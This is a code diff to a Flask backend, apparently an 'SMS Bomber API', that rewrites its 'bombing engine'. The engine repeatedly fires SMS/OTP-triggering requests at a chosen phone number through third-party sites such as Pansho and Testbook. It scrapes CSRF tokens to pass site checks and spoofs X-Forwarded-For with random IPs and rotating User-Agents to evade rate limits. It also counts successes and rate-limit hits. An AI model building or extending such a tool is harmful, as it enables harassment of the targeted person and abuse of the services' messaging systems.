@@ -7,6 +7,7 @@ import random
 import threading
 import requests as req_lib
 from datetime import datetime
+from bs4 import BeautifulSoup
 
 app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
 CORS(app)
@@ -44,12 +45,132 @@ bombing_active = False
 bombing_thread = None
 bombing_lock = threading.Lock()
 
+# ===== PANSHO SESSION REFRESH =====
+def get_pansho_session():
+    """Get fresh session for Pansho"""
+    session = req_lib.Session()
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+    }
+    
+    try:
+        # GET home page to get cookies and CSRF token
+        resp = session.get('https://pansho.com/', headers=headers, timeout=10)
+        soup = BeautifulSoup(resp.text, 'html.parser')
+        
+        # Extract CSRF token
+        token = None
+        token_input = soup.find('input', {'name': '_token'})
+        if token_input:
+            token = token_input.get('value')
+        if not token:
+            meta = soup.find('meta', {'name': 'csrf-token'})
+            if meta:
+                token = meta.get('content')
+        
+        if not token:
+            token = 'DUMMY_TOKEN'
+        
+        cookies = session.cookies.get_dict()
+        return session, cookies, token
+    except Exception as e:
+        print(f"❌ Pansho session failed: {e}")
+        return None, None, None
+
+# ===== BOMBING ENGINE =====
+def bombing_worker(phone):
+    global bombing_active, stats_data
+    active_requests = [r for r in requests_data if r.get('active', True)]
+    
+    if not active_requests:
+        bombing_active = False
+        return
+    
+    # Pansho session cache
+    pansho_session = None
+    pansho_cookies = {}
+    pansho_token = None
+    
+    while bombing_active:
+        for req in active_requests:
+            if not bombing_active:
+                break
+            
+            # If Pansho, refresh session every 10 requests
+            if 'pansho' in req['name'].lower():
+                if not pansho_session or stats_data['total_requests'] % 10 == 0:
+                    pansho_session, pansho_cookies, pansho_token = get_pansho_session()
+                    if not pansho_session:
+                        time.sleep(1)
+                        continue
+            
+            # Phone variations
+            phone_variants = req.get('phones', [phone])
+            target_phone = random.choice(phone_variants) if phone_variants else phone
+            
+            # Build request
+            url = req['url'].replace('{phone}', target_phone)
+            headers = req['headers'].copy()
+            headers['User-Agent'] = random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+            ])
+            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+            
+            try:
+                # Use session for Pansho, fresh for Testbook
+                if 'pansho' in req['name'].lower() and pansho_session:
+                    session = pansho_session
+                    # Update token in body
+                    body = req['body'].replace('{phone}', target_phone)
+                    body = body.replace('{token}', pansho_token)
+                    if req['method'] == 'POST':
+                        r = session.post(url, headers=headers, data=body, timeout=5)
+                    else:
+                        r = session.get(url, headers=headers, timeout=5)
+                else:
+                    # Testbook or other - fresh request
+                    session = req_lib.Session()
+                    if req['method'] == 'POST':
+                        if isinstance(req['body'], dict):
+                            r = session.post(url, headers=headers, json=req['body'], timeout=5)
+                        else:
+                            body = req['body'].replace('{phone}', target_phone)
+                            r = session.post(url, headers=headers, data=body, timeout=5)
+                    else:
+                        r = session.get(url, headers=headers, timeout=5)
+                
+                with bombing_lock:
+                    stats_data['total_requests'] += 1
+                    if r.status_code in [200, 302, 201, 202]:
+                        stats_data['success'] += 1
+                    elif r.status_code == 429:
+                        stats_data['rate_limited'] += 1
+                    else:
+                        stats_data['failed'] += 1
+                    save_stats(stats_data)
+                
+                print(f"[{req['name']}] {r.status_code} | {target_phone}")
+                
+            except Exception as e:
+                with bombing_lock:
+                    stats_data['total_requests'] += 1
+                    stats_data['failed'] += 1
+                    save_stats(stats_data)
+                print(f"[{req['name']}] ERROR: {str(e)[:50]}")
+            
+            # 0.6 sec delay = 100 req/min per thread
+            time.sleep(0.6)
+
 # ===== ROUTES =====
 
 @app.route('/')
 @app.route('/api/health')
 def health():
-    return jsonify({"status": "ok", "message": "Pansho Bomber API is live!"})
+    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})
 
 @app.route('/api/requests', methods=['GET'])
 def get_requests():
@@ -110,77 +231,6 @@ def bombing_status():
         "stats": stats_data,
         "active_requests": sum(1 for r in requests_data if r.get('active', True))
     })
-
-# ===== BOMBING ENGINE (Pansho Style) =====
-def bombing_worker(phone):
-    global bombing_active, stats_data
-    active_requests = [r for r in requests_data if r.get('active', True)]
-    
-    if not active_requests:
-        bombing_active = False
-        return
-    
-    # Store session data per request
-    sessions = {}
-    
-    while bombing_active:
-        for req in active_requests:
-            if not bombing_active:
-                break
-            
-            # Get or create session for this request
-            if req['name'] not in sessions:
-                sessions[req['name']] = {
-                    'session': req_lib.Session(),
-                    'cookies': {},
-                    'token': None
-                }
-            
-            session_data = sessions[req['name']]
-            
-            # Phone variations
-            phone_variants = req.get('phones', [phone])
-            target_phone = random.choice(phone_variants) if phone_variants else phone
-            
-            # Build request
-            url = req['url'].replace('{phone}', target_phone)
-            headers = req['headers'].copy()
-            headers['User-Agent'] = random.choice([
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
-            ])
-            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-            
-            try:
-                if req['method'] == 'POST':
-                    if isinstance(req['body'], dict):
-                        r = session_data['session'].post(url, headers=headers, json=req['body'], timeout=5)
-                    else:
-                        body = req['body'].replace('{phone}', target_phone)
-                        r = session_data['session'].post(url, headers=headers, data=body, timeout=5)
-                else:
-                    r = session_data['session'].get(url, headers=headers, timeout=5)
-                
-                with bombing_lock:
-                    stats_data['total_requests'] += 1
-                    if r.status_code in [200, 302, 201, 202]:
-                        stats_data['success'] += 1
-                    elif r.status_code == 429:
-                        stats_data['rate_limited'] += 1
-                    else:
-                        stats_data['failed'] += 1
-                    save_stats(stats_data)
-                
-                print(f"[{req['name']}] {r.status_code} | {target_phone}")
-                
-            except Exception as e:
-                with bombing_lock:
-                    stats_data['total_requests'] += 1
-                    stats_data['failed'] += 1
-                    save_stats(stats_data)
-                print(f"[{req['name']}] ERROR: {str(e)[:50]}")
-            
-            time.sleep(0.1)
 
 @app.route('/admin')
 @app.route('/admin/')
